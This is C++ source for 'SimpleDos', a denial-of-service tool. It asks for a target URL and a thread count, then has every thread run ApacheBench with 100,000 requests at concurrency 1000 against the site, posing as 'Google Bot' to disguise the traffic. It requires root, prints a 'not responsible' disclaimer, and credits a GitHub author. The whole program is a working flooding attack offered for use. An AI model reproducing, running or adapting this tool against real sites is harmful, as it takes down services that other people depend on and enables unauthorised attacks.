#include<vector>
#include<thread>
#include<iostream>
#include<stdlib.h>
#include<unistd.h>
#include<fstream>
using namespace std;

bool checkRoot() {						//Create a function for check root
	return getuid() ? false : true;
}

void logo(){							//Create a function for simplified logo output
	system("toilet -s -w 150 -f mono12 -F metal SimpleDos");
}

void dos(string site){
	system(("ab -n 100000 -c 1000 -k -r -H \"User-Agent: Google Bot\" " + site + " > log").c_str()); //Execute command
}

void checkSite(){ //Create a function to check url
	string l; //Enter variables
	ifstream fin("log"); //Open the file in which the output of the ab command is written and take the first word from there
		fin >> l; //Load this word into a variable
			if(l==""){ //If an error occurred due to the url, then the output in the file will be empty, as well as the variable
				system("clear"); //Clear console
				system("rm -rf log"); //Remove the log (output) file
					logo(); //Display logo
						cout<<"\t\t\t\tError, wrong url, or hosting disabled\n\n"; //Display message about error
						cout<<"\t\tWrite url behind the template --> http[s]://]hostname[:port]/path\n\n";
							exit(0); //Code completion
				}else{ //If the error did not occur, then let the code execute further
					system("clear"); //Clear console
					system("rm -rf log"); //Remove the log (output) file
						}
}

int main(){ //Create main function
	int number;
	string site; //Enter variables
		if(checkRoot()){ //If the user is root
			system("clear"); //Clear console
				logo(); //Display logo
					cout<<"\t\tI AM NOT RESPONSIBLE FOR HOW YOU WILL USE THIS PROGRAM!\n"; //Display Disclaimer
					cout<<"\nEnter site to Dos [http[s]://]hostname[:port]/path] --> ";
						cin>>site; //Enter the site url
					cout<<"Enter the number of threads (Enter an adequate number)-->";
						cin>>number;
						if (number<1){
						system("clear"); //Clear console
						logo(); //Display logo
						cout<<"\t\tYou are idiot? ERROR\n";
						return 0;
						}else{
					cout<<"\n\n Ctrl+C to stop Dos\n\n";
					std::vector<std::thread> threads;
					  threads.reserve(number);
					  for (int i = 0; i < number; ++i) {         // (1)
					    threads.emplace_back(dos, site);
					  }
					 system(("ab -n 100000 -c 1000 -k -r -H \"User-Agent: Google Bot\" " + site + " > log").c_str()); //Execute command
				checkSite(); //Call the function to check url
				for (auto& thread : threads) {          // (2)
				    thread.join();
				  }
				logo(); //Display logo
					cout<<"\t\t\t\t\tThanks for using!\n";
					cout<<"\t\t\t\tAuthor --> https://github.com/Tanskicorp\n\n";
						}
			}else{ //If the user is not root
				system("clear"); //Clear console
					logo(); //Display logo
						cout<<"\t\t\t\t\tError, run it as root\n\n"; //Display error
	}
}
